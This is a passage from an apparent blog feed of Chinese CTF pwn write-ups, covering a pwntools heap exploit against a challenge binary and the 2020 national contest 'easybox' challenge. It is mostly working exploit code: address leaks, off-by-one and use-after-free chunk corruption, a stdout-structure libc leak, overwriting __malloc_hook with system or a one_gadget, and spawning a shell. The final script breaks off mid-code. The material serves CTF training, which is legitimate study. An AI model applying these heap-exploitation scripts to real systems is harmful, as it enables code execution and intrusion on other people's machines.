punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xc8aaa</span><span class="token punctuation">,</span><span class="token number">0xc8aad</span><span class="token punctuation">,</span><span class="token number">0xc8ab0</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">2</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_ld</span><span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Force to use assigned new ld.so by changing the binary    """</span>    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>ld<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>        log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to ld"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> None    <span class="token keyword">if</span> <span class="token operator">not</span> isinstance<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ELF<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to binary"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> None        binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>    <span class="token keyword">for</span> segment <span class="token keyword">in</span> binary<span class="token punctuation">.</span>segments<span class="token punctuation">:</span>        <span class="token keyword">if</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'PT_INTERP'</span><span class="token punctuation">:</span>            size <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_memsz'</span><span class="token punctuation">]</span>            addr <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_paddr'</span><span class="token punctuation">]</span>            data <span class="token operator">=</span> segment<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> size <span class="token operator">&lt;=</span> len<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">:</span>                log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Failed to change PT_INTERP from {} to {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> None            binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> ld<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">)</span>            path <span class="token operator">=</span> <span class="token string">'/tmp/pwn/{}_debug'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>binary<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>path<span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                info<span class="token punctuation">(</span><span class="token string">"Removing exist file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            binary<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0b111000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rwx------</span>    success<span class="token punctuation">(</span><span class="token string">"PT_INTERP has changed from {} to {}. Using temp file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ELF<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># example</span>elf <span class="token operator">=</span> change_ld<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">,</span> <span class="token string">'./ld.so'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#elf = ELF("./pwn")</span>libc_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span><span class="token keyword">if</span> debug <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> debug <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">,</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./x64_libc.so.6'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'f.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">20173</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Small</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"How much area do you want: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Large</span><span class="token punctuation">(</span>sz<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How much area do you want: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"place: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Specify the index of your area: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Give me a secret code: "</span><span class="token punctuation">,</span>GetRandNum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Come and build something: "</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">GetRandNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    status<span class="token punctuation">,</span>output <span class="token operator">=</span> commands<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">(</span><span class="token string">"./rand"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> output<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">GetAddr</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>sz<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        Large<span class="token punctuation">(</span>sz<span class="token punctuation">,</span>start<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token string">""</span>        data <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"Sorry, your preferred place has been taken."</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#fail the real address is in lower</span>            sz <span class="token operator">=</span> sz <span class="token operator">/</span> <span class="token number">2</span>            sz <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>sz <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#print hex(start+sz)+":too big"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#success so the real address is higher</span>            start <span class="token operator">+=</span> sz            <span class="token comment" spellcheck="true">#sz = sz + sz/2</span>            <span class="token comment" spellcheck="true">#sz = (((sz >> 12)) &lt;&lt; 12)</span>            <span class="token comment" spellcheck="true">#print hex(start)+":too small"</span>        <span class="token keyword">if</span> sz <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> start<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#leak proc base</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    proc_base <span class="token operator">=</span> GetAddr<span class="token punctuation">(</span><span class="token number">0x0000550000000000</span><span class="token punctuation">,</span><span class="token number">0x13075f29000</span><span class="token punctuation">)</span>    <span class="token number">0x550000000000</span>    <span class="token number">0x13075f29000</span>    <span class="token number">0x55b568119000</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>proc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#leak heap</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    Small<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>    heap_base <span class="token operator">=</span> GetAddr<span class="token punctuation">(</span>proc_base<span class="token operator">+</span><span class="token number">0x5000</span><span class="token punctuation">,</span><span class="token number">0x13724000</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#leak libc</span>    libc_base <span class="token operator">=</span>GetAddr<span class="token punctuation">(</span><span class="token number">0x00007f0000000000</span><span class="token punctuation">,</span><span class="token number">0x803774f000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x2000</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base => "</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#UAF</span>    Small<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Done, Index is "</span><span class="token punctuation">)</span>    idx <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#raw_input()</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>idx<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    Edit<span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xc41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    Small<span class="token punctuation">(</span><span class="token number">0xbc0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx1+1</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    Small<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx1+2</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    <span class="token comment" spellcheck="true">#two</span>    Edit<span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0x208</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdf1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    Small<span class="token punctuation">(</span><span class="token number">0xd70</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx+3</span>    Small<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx+4</span>    libc<span class="token punctuation">.</span>address <span class="token operator">=</span> libc_base    shell_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>gadgets<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    success<span class="token punctuation">(</span><span class="token string">"shell addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    Edit<span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">0xd78</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x51</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x21fa0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    Small<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx+5</span>    Small<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx+6</span>    realloc <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span>    raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>    Large<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span><span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#idx+7</span>    Edit<span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span>    Edit<span class="token punctuation">(</span>idx<span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(p)</span>    Small<span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020-国赛初赛PWN题记录</title>
      <link href="/2020/09/24/2020-guo-sai-chu-sai-pwn-ti-ji-lu/"/>
      <url>/2020/09/24/2020-guo-sai-chu-sai-pwn-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><strong>考点：IO leak、off by one、2.23</strong></p><p>堆溢出，off by one，没有show功能，和蓝帽杯一道题只是换成了2.23。思路是将一个chunk同时释放到unsorted bin和fastbin 0x70那条链中，这样可以UAF，劫持stdout地址泄露libc，第二次改hook为one_gadget</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"split"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> len<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"len:"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">>>"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"idx:"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span><span class="token string">"\x71"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token string">"\xdd\x25"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token operator">+</span><span class="token string">"\x71"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7dd2600</span><span class="token operator">+</span><span class="token number">0x7ffff7a0d000</span>success<span class="token punctuation">(</span><span class="token string">"libc address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>victim_address <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x23</span>create<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token 